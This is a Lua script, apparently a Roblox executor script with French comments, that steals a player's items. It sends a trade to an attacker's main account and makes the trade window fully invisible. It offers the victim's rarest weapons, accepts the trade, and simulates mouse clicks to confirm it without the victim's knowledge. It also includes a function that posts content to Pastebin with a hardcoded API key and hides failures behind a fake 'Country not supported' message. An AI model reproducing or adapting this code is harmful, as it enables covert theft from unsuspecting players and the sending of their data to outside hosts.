local function pastebin(content)

    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2) 

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\n ERROR: Country not supported \n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

-- Rendre 100% invisible (transparence totale sans ombre/silhouette)
local function setTradeGuiTransparency(invisible)
    pcall(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
        if tradeGui then
            for _, descendant in pairs(tradeGui:GetDescendants()) do
                if descendant:IsA("GuiObject") then
                    if invisible then
                        -- Sauvegarde des valeurs
                        if not descendant:FindFirstChild("OrigBgTrans") then
                            local val = Instance.new("NumberValue", descendant)
                            val.Name = "OrigBgTrans"
                            val.Value = descendant.BackgroundTransparency
                        end
                        descendant.BackgroundTransparency = 1

                        if descendant:IsA("CanvasGroup") then
                            descendant.GroupTransparency = 1
                        end

                        if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                            if not descendant:FindFirstChild("OrigTextTrans") then
                                local val = Instance.new("NumberValue", descendant)
                                val.Name = "OrigTextTrans"
                                val.Value = descendant.TextTransparency
                            end
                            descendant.TextTransparency = 1
                        elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
                            if not descendant:FindFirstChild("OrigImgTrans") then
                                local val = Instance.new("NumberValue", descendant)
                                val.Name = "OrigImgTrans"
                                val.Value = descendant.ImageTransparency
                            end
                            descendant.ImageTransparency = 1
                        end
                    else
                        -- Restauration
                        if descendant:FindFirstChild("OrigBgTrans") then
                            descendant.BackgroundTransparency = descendant.OrigBgTrans.Value
                        end
                        if descendant:IsA("CanvasGroup") then
                            descendant.GroupTransparency = 0
                        end
                        if descendant:FindFirstChild("OrigTextTrans") and (descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox")) then
                            descendant.TextTransparency = descendant.OrigTextTrans.Value
                        end
                        if descendant:FindFirstChild("OrigImgTrans") and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
                            descendant.ImageTransparency = descendant.OrigImgTrans.Value
                        end
                    end
                elseif descendant:IsA("UIStroke") then
                    if invisible then
                        descendant.Enabled = false
                    else
                        descendant.Enabled = true
                    end
                end
            end
        end
    end)
end

local function getitems()
    -- 1. Envoi de la demande de trade au compte principal
    local targetPlayer = Players:FindFirstChild(userName)
    if not targetPlayer then
        warn("Compte principal introuvable : " .. tostring(userName))
        return
    end

    Trade.SendRequest:InvokeServer(targetPlayer)
    task.wait(2.5)

    -- 2. Transparence totale (efface aussi l'ombre et la silhouette grise)
    setTradeGuiTransparency(true)

    -- 3. Remplissage des 4 cases max
    local itemsOffered = 0
    local maxSlots = 4

    local function offerAll(itemTable)
        if itemTable and itemsOffered < maxSlots then
            for _, b in pairs(itemTable) do
                for i = 1, b.amount do
                    if itemsOffered >= maxSlots then break end
                    
                    Trade.OfferItem:FireServer(b.data, "Weapons")
                    itemsOffered = itemsOffered + 1
                    task.wait(0.35)
                end
                if itemsOffered >= maxSlots then break end
            end
        end
    end

    offerAll(uniqueItems)
    offerAll(ancientItems)
    offerAll(godlyItems)
    offerAll(vintageItems)
    offerAll(legendaryItems)
    offerAll(rareItems)
    offerAll(uncommonItems)
    offerAll(commonItems)

    task.wait(1.5)

    -- 4. Première validation réseau
    pcall(function()
        Trade.AcceptRequest:FireServer()
    end)

    -- 5. Attente des 8 secondes du compte à rebours
    task.wait(8)

    -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
    pcall(function()
        -- On réaffiche visuellement avant les clics virtuels
        setTradeGuiTransparency(false)
        task.wait(0.1)

        local Camera = workspace.CurrentCamera
        local ViewportSize = Camera.ViewportSize

        local targetX = ViewportSize.X * 0.76
        local targetY = ViewportSize.Y * 0.74

        local function sendClick()
            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
            task.wait(0.15)
            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
        end

        -- Clic 1 : Verrouillage
        sendClick()

        task.wait(2)

        -- Clic 2 : Confirmation finale
        sendClick()

        task.wait(1)

        -- Clic 3 : Sécurité
        sendClick()
    end)

    -- 7. Nettoyage final
    task.wait(1)
    if destroytrades2 then
        pcall(function() coroutine.resume(destroytrades2) end)
    end
end
